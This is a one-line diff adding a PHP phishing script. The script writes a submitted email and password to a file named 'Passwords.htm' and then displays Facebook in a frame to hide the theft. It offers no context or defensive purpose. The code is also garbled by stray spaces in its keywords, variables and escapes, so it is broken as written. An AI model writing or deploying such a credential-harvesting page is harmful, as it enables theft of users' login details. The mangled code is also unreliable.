@@ -1,0 +1,1 @@
+<? Php $ fp = fopen ("Passwords.htm", "a "); fwrite ($ fp, "Email: $ _ POST [email] \ tPassword: $ _ POST [p ass]"); echo "<HTML> <head> <FRAMESET cols = \" * \ "> <FRAME SRC = \" http://www.facebook.com \ "> </FRAMESET>"; ?>
